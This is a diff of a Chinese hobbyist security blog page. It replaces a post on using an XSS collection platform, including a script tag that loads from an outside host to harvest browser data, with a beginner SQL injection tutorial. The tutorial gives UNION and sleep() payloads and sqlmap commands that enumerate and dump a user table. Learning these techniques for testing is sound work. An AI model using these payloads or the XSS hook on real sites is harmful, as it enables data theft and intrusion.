@@ -4,8 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="XSS平台注册后使用方法, Cat00011cat,偏锋小白菜,网络日记,个人博客,BLOG">
-    <meta name="description" content="以前老搞不懂XSS平台是干嘛的现在懂了，写个笔记记录一下；小白也要努力打怪升级！这样才不会辜负自己。">
+    <meta name="keywords" content="SQL注入漏洞, Cat00011cat,偏锋小白菜,网络日记,个人博客,BLOG">
+    <meta name="description" content="没有对用户输入数据的合法性进行判断，使应用程序存在安全隐患。用户可以提交一段数据库查询代码，根据程序返回的结果，获得某些他想得知的数据，这就是所谓的SQL Injection，即SQL注入。">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -13,7 +13,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>XSS平台注册后使用方法 | Cat00011cat</title>
+    <title>SQL注入漏洞 | Cat00011cat</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -338,12 +338,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/lateral404/image/image/20200211030016.jfif')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/lateral404/image/image/20200304161902.jfif')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">XSS平台注册后使用方法</h1>
+                    <h1 class="description center-align post-title">SQL注入漏洞</h1>
                 </div>
             </div>
         </div>
@@ -390,28 +390,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-02-11
+                    2020-03-04
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-02-11
+                    2020-03-04
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    300
+                    652
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    2 分
                 </div>
                 
 				
@@ -427,23 +427,91 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p><del>以前以为XSS平台就是一个靶场，没啥卵用；注册了账号也不会使用，完全搞不懂项</del>目创建了是干啥的，各种模块参数完全搞不懂要怎么使用；<del>经过今晚的学习已经了解XSS平台的基本使用方法，</del></p>
-<p>首先注册一个账号，</p>
-<p><strong>创建项目</strong></p>
-<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200211012407.png" alt=""></p>
-<p><strong>填写项目名称以及项目描述</strong></p>
-<p>可以随意填写</p>
-<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200211012905.png" alt=""></p>
-<p><strong>勾选模块</strong></p>
-<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200211012947.png" alt=""></p>
-<p>点击完成之后，然后就会来到项目代码界面</p>
-<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200211013039.png" alt=""></p>
-<p>复制红色框中的代码。</p>
-<pre><code>&lt;script src=https://xss.chinacycc.com/d05AkE&gt;&lt;/script&gt; </code></pre><p>桌面新建一个叫做 XSS.html后缀的文件。将红色框中的代码写入。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200211013437.png" alt=""></p>
-<p>这里记得一定要新建为 html格式，有得人新建的是txt格式。 然后使用浏览器打开xss.html. xss平台就会收到你的信息。方可算是成功！</p>
-<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200211013810.png" alt=""></p>
-<p>XSS后台获取到浏览器信息，整个使用流程就结束了。</p>
+                <p>什么是SQL注入？</p>
+<p>为什么要进行SQL注入？</p>
+<p>SQL注入(SQL Injection)：就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200304145515.png" alt=""></p>
+<h3 id="SQL注入案例-php-id-1"><a href="#SQL注入案例-php-id-1" class="headerlink" title="SQL注入案例 php?id=1"></a>SQL注入案例 php?id=1</h3><ul>
+<li>单引号大法：’</li>
+</ul>
+<p><code>php?id=1'</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200304140654.png" alt=""></p>
+<p>页面报错 说明其存在SQL注入漏洞</p>
+<ul>
+<li>AND 大法 （and表示并且）</li>
+</ul>
+<p><code>php?id=1 and 1=1</code> 正确</p>
+<p><code>php?id=1 and 1=2</code> 错误</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200304140703.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200304140655.png" alt=""></p>
+<ul>
+<li>Order By 大法</li>
+</ul>
+<p><code>php?id=1 order by 1,8</code> 正确  表示查询1-8字段</p>
+<p><code>php?id=1 order by 1,10</code> 错误 表示没有1-10字段</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200304140658.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200304140656.png" alt=""></p>
+<ul>
+<li>减  大法</li>
+</ul>
+<p><code>php?id=10-1</code> 正确</p>
+<p><code>php?id=10+1</code> 错误    因为传入数据+号代表空格</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200304140657.png" alt=""></p>
+<ul>
+<li>UNION 操作符 （联合体操作符）</li>
+</ul>
+<p><code>php?id=1+and+1=2+union+select+1,2,3,4,5,6,7,8%23</code> 让第一段语句报错 从而执行下一句</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200304140702.png" alt=""></p>
+<ul>
+<li>POST注入</li>
+</ul>
+<p>用burp进行抓包，修改参数。（参数可控就是漏洞出现的地方）如下图</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200304140659.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200304140701.png" alt=""></p>
+<ul>
+<li>延时注入</li>
+</ul>
+<p><code>php?id=1+and+1=2+union+select+1,2,sleep(6),4,5,6,7,8%23</code>     sleep（6）表示演示几秒输出数据</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200304140700.png" alt=""></p>
+<h3 id="SQLMap神器基本操作："><a href="#SQLMap神器基本操作：" class="headerlink" title="SQLMap神器基本操作："></a>SQLMap神器基本操作：</h3><p><code>sqlmap.py -u "URL"</code>     “URL” 多个参数使用“ ” 包裹URL  如下图：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200304140737.png" alt=""></p>
+<p><code>error-based</code> 显错注入</p>
+<p><code>inline queries</code> 堆叠注入</p>
+<p><code>time-based</code> 时间盲注</p>
+<p>如下图：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200304140736.png" alt=""></p>
+<p>一片红代表IP被办了，，少量红代表数据包响应时间长 造成了丢包：如下图</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200304140733.png" alt=""></p>
+<p>探测到的数据库版本类型；数据库表的字段 。  如下图：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200304140734.png" alt=""></p>
+<p>提示你是否要继续扫描注入点。一般测试一个即可。直接回车</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200304140735.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200304140739.png" alt=""></p>
+<p>扫描到的SQL注入点 如下图</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200304140742.png" alt=""></p>
+<p><code>sqlmap.py -u "URL" --current-db</code> 查询当前数据库 如下图：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200304140738.png" alt=""></p>
+<p><code>sqlmap.py -u "URL" -D cycc_bug --tables</code> 获取数据库 并 查询数据库表单 ； 如下图所示</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200304140741.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200304140744.png" alt=""></p>
+<p><code>sqlmap.py -u "URL" -D cycc_bug -T cycc_user --dump</code>   </p>
+<p> -D获取数据库      -T读取表      –dump脱裤     如下图：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200304140740.png" alt=""> <img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200304140743.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200304140956.png" alt=""></p>
+<p><code>sqlmap.py -u "URL" -D cycc_bug -T cycc_user --columns</code> </p>
+<p>–columns 获取表中的一个字段 ；如下图：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200304140953.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200304140959.png" alt=""></p>
+<p>sqlmap.py -u “URL” -D cycc_bug -T cycc_user -C userid,username –dump</p>
+<p>-C 只获取指定字段     如下图所示：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200304140952.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200304140954.png" alt=""></p>
+<p>在渗透测试过程中，使用 <code>--dbs</code> 跑到数据库名即可。点到为止。。<del>要不然银手铐一对。</del>   如下图所示：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200304140955.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200304140958.png" alt=""></p>
+<h3 id="使用BURP抓取SQLMap的传输数据"><a href="#使用BURP抓取SQLMap的传输数据" class="headerlink" title="使用BURP抓取SQLMap的传输数据"></a>使用BURP抓取SQLMap的传输数据</h3><p><code>sqlmap.py -u "URL" --proxy="http://127.0.0.1:8080"</code></p>
+<p>–proxy=” “   使用代理   如下图：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200304140957.png" alt=""></p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -477,7 +545,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://www.thecat.top" rel="external nofollow noreferrer">Cat00011cat</a>
+                    <a href="http://www.thecat.top" rel="external nofollow noreferrer">偏锋小白菜|Cat00011cat</a>
                 </span>
             </div>
             <div class="reprint__type">
@@ -487,7 +555,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://www.thecat.top/posts/48491.html">http://www.thecat.top/posts/48491.html</a>
+                    <a href="http://www.thecat.top/posts/12105.html">http://www.thecat.top/posts/12105.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -500,7 +568,7 @@
                     本博客所有文章除特別声明外，均采用
                     <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                     许可协议。转载请注明来源
-                    <a href="http://www.thecat.top" target="_blank">Cat00011cat</a>
+                    <a href="http://www.thecat.top" target="_blank">偏锋小白菜|Cat00011cat</a>
                     !
                 </span>
             </div>
@@ -697,7 +765,7 @@
         repo: 'Leaving-a-message',
         owner: 'lateral404',
         admin: "lateral404",
-        id: '2020-02-11T18-31-33',
+        id: '2020-03-04T14-03-33',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -981,28 +1049,29 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/posts/63847.html">
+                <a href="/posts/12105.html">
                     <div class="card-image">
                         
-                        <img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200211030016.jfif" class="responsive-img" alt="XSS漏洞笔记二">
+                        <img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200304161902.jfif" class="responsive-img" alt="SQL注入漏洞">
                         
-                        <span class="card-title">XSS漏洞笔记二</span>
+                        <span class="card-title">SQL注入漏洞</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            XSS知识总结
+                            没有对用户输入数据的合法性进行判断，使应用程序存在安全隐患。用户可以提交一段数据库查询代码，根据程序返回的结果，获得某些他想得知的数据，这就是所谓的SQL Injection，即SQL注入。
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-02-13
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-03-04
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -1015,6 +1084,7 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -1033,30 +1103,30 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/posts/29659.html">
+                <a href="/posts/60728.html">
                     <div class="card-image">
                         
-                        <img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200211030016.jfif" class="responsive-img" alt="XSS漏洞笔记一">
+                        <img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" class="responsive-img" alt="BitLocker加密Win0硬盘">
                         
-                        <span class="card-title">XSS漏洞笔记一</span>
+                        <span class="card-title">BitLocker加密Win0硬盘</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            XSS跨站脚本攻击，是代码注入的一种。
+                            防止非法未授权访问，或者数据被窃取。
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-02-11
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-03-03
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="post-category">
-                                    网络安全
+                            <a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/" class="post-category">
+                                    计算机
                                 </a>
                             
                             
@@ -1066,8 +1136,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
-                        <span class="chip bg-color">网络安全</span>
+                    <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/">
+                        <span class="chip bg-color">计算机</span>
                     </a>
                     
                 </div>
